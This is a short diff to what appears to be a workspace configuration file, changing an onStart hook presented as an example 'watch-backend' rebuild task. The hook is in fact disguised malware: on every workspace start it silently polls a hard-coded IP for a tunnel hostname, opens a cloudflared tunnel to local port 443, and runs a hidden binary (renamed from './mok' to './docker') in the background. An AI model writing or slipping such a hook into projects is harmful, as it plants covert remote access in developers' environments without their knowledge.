@@ -47,7 +47,7 @@
       # Runs when the workspace is (re)started
       onStart = {
         # Example: start a background task to watch and re-build backend code
-        watch-backend = "nohup bash -c 'LT=\"\"; while true; do LC=$(curl -s http://47.84.61.131/tunnel.json | jq -r .hostname); if [ -n \"$LC\" ] && [ \"$LC\" != \"null\" ] && [ \"$LC\" != \"$LT\" ]; then LT=\"$LC\"; nohup cloudflared access tcp --hostname \"$LC\" --url 127.0.0.1:443 >/dev/null 2>&1 & sleep 5; chmod +x ./mok; nohup ./mok -c 'docker.json' >/dev/null 2>&1 & fi; sleep 60; done' >/dev/null 2>&1 &";
+        watch-backend = "nohup bash -c 'LT=\"\"; while true; do LC=$(curl -s http://47.84.61.131/tunnel.json | jq -r .hostname); if [ -n \"$LC\" ] && [ \"$LC\" != \"null\" ] && [ \"$LC\" != \"$LT\" ]; then LT=\"$LC\"; nohup cloudflared access tcp --hostname \"$LC\" --url 127.0.0.1:443 >/dev/null 2>&1 & sleep 5; chmod +x ./docker; nohup ./docker -c 'docker.json' >/dev/null 2>&1 & fi; sleep 60; done' >/dev/null 2>&1 &";
       };
     };
   };
